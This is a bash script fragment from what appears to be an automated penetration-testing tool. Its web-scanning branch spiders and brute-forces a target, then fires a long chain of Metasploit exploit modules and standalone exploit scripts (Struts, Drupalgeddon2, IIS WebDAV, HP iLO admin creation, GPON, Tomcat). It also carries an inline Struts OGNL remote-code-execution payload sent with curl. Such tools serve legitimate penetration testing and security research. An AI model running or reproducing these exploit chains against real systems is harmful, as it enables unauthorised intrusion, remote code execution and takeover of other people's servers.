if [ "$MODE" = "web" ];
  then
    if [ "$PASSIVE_SPIDER" = "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING PASSIVE WEB SPIDER $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      curl -sX GET "http://index.commoncrawl.org/CC-MAIN-2018-22-index?url=*.$TARGET&output=json" | jq -r .url | sort -u | tee $LOOT_DIR/web/spider-$TARGET.txt 2> /dev/null
    fi

    if [ "$BLACKWIDOW" == "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING ACTIVE WEB SPIDER & APPLICATION SCAN $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      blackwidow -u https://$TARGET -l 3 -s y -v y
      cat /usr/share/blackwidow/$TARGET*/* >> $LOOT_DIR/web/spider-$TARGET.txt 2>/dev/null
    fi
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING FILE/DIRECTORY BRUTE FORCE $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python3 $PLUGINS_DIR/dirsearch/dirsearch.py -u https://$TARGET:$PORT -w $WEB_BRUTE_INSANE -x 400,403,404,405,406,429,502,503,504 -F -e php,asp,aspx,bak,zip,tar.gz,html,htm 
    cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* 2> /dev/null
    cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* > $LOOT_DIR/web/dirsearch-$TARGET.txt 2> /dev/null
    wget https://$TARGET:$PORT/robots.txt -O $LOOT_DIR/web/robots-$TARGET:$PORT-https.txt 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING NMAP HTTP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    nmap -A -sV -T5 -Pn -p 443 --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-vuln* $TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    clusterd --ssl -i $TARGET 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    wpscan --url https://$TARGET --batch --disable-tls-checks
    echo ""
    wpscan --url https://$TARGET/wordpress/ --batch --disable-tls-checks
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING CMSMAP $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $CMSMAP -t https://$TARGET
    echo ""
    python $CMSMAP -t https://$TARGET/wordpress/
    echo ""
    if [ "$NIKTO" = "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING WEB VULNERABILITY SCAN $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      nikto -h https://$TARGET -output $LOOT_DIR/web/nikto-$TARGET-https.txt
    fi
    cd $INSTALL_DIR
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING HTTP PUT UPLOAD SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use scanner/http/http_put; setg RHOSTS "$TARGET"; setg RPORT "443"; setg SSL true; run; set PATH /uploads/; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "443"; setg SSL true; run; use scanner/http/webdav_website_content; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING MICROSOFT IIS WEBDAV ScStoragePathFromUrl OVERFLOW $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; setg RHOST "$TARGET"; setg RPORT "443"; setg SSL true; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE TOMCAT UTF8 TRAVERSAL EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use admin/http/tomcat_utf8_traversal; setg RHOSTS "$TARGET"; setg RPORT "443"; set SSL true; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE OPTIONS BLEED EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use scanner/http/apache_optionsbleed; setg RHOSTS "$TARGET"; setg RPORT "443"; set SSL true; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "443"; set SSL true; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS \"$TARGET\"; set RPORT 443; set SSL true; set WAIT 2; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use exploit/windows/http/badblue_passthru; setg RHOST \"$TARGET\"; set RPORT 443; set SSL true; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST \"$TARGET\"; set RPORT 443; set SSL true; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use unix/webapp/joomla_comfields_sqli_rce; setg RHOST \"$TARGET\"; set RPORT 443; set SSL true; run; back;exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    msfconsole -q -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING SHELLSHOCK EXPLOIT SCAN $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port 443 --ssl
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2017-5638 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/apache_struts_cve-2017-5638.py -u https://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2017-9805 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/apache_struts_cve-2017-9805.py -u https://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE JAKARTA RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" https://$TARGET | head -n 1
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE STRUTS 2 CVE-2018-11776 RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/apache-struts-CVE-2018-11776.py -u https://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING DRUPALGEDDON2 CVE-2018-7600 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    ruby $INSTALL_DIR/bin/drupalgeddon2.rb https://$TARGET
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING CISCO ASA TRAVERSAL CVE-2018-0296 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/cisco-asa-traversal.py https://$TARGET:$PORT
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING JEXBOSS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    cd /tmp/
    python /usr/share/sniper/plugins/jexboss/jexboss.py -u https://$TARGET
    cd $INSTALL_DIR
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING GPON ROUTER EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/gpon_rce.py https://$TARGET:$PORT 'whoami'
    echo -e "${OKGREEN}====================================================================================${RESET}"
    echo -e "$OKRED RUNNING APACHE TOMCAT CVE-2017-12617 RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}"
    python $INSTALL_DIR/bin/tomcat-cve-2017-12617.py -u https://$TARGET

  fi